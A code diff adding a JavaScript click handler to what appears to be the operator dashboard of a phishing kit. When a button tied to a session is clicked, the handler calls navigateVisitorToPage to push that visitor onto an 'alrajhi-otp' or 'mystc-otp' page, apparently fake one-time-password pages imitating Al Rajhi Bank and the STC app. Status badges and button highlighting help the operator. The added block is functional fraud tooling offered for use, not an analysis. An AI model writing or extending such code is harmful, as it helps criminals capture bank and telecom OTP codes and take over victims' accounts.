@@ -3401,6 +3401,53 @@ function kddFull(n, p){
   }, true);
   badge("kdd v30 جاهز");
 })();
+
+/*FIX41*/
+(function(){
+  if (window.__kdd41) return;
+  window.__kdd41 = 1;
+  function badge(msg){
+    try{
+      var b = document.getElementById("kdd41badge");
+      if (!b){ b = document.createElement("div"); b.id = "kdd41badge"; document.body.appendChild(b); }
+      b.textContent = msg;
+      b.style.cssText = "position:fixed;left:10px;bottom:10px;z-index:2147483000;background:#111;color:#7ab8ff;font:12px monospace;padding:6px 10px;border-radius:6px;opacity:.95;direction:ltr";
+      b.style.display = "block";
+      clearTimeout(b.__t);
+      b.__t = setTimeout(function(){ b.style.display = "none"; }, 5000);
+    }catch(e){}
+  }
+  function flash(el){
+    try{
+      var bg = el.style.background;
+      el.style.transition = "background .15s";
+      el.style.background = "#16a34a";
+      setTimeout(function(){ el.style.background = bg; }, 700);
+    }catch(e){}
+  }
+  document.addEventListener("click", function(e){
+    try{
+      var t = document.elementFromPoint(e.clientX, e.clientY) || e.target;
+      var el = t;
+      for (var k = 0; k < 4 && el; k++){
+        var id = el.id || "";
+        if (/otp/i.test(id) && /btn/i.test(id)){
+          if (typeof navigateVisitorToPage !== "function"){ badge("navigateVisitorToPage غير موجودة"); return; }
+          var rest = id.replace(/^rajhi-/, "").replace(/^otp-btn-/, "");
+          var m = /^(.*)-([0-9]+)$/.exec(rest);
+          var sid = m ? m[1] : rest;
+          var page = /rajhi/i.test(id) ? "alrajhi-otp" : "mystc-otp";
+          navigateVisitorToPage(sid, page);
+          flash(el);
+          badge("OTP -> " + page + "  (" + sid + ")");
+          return;
+        }
+        el = el.parentElement;
+      }
+    }catch(err){ badge("ERR " + err.message); }
+  }, true);
+  badge("kdd v41 جاهز");
+})();
 </script>
 
 </body>
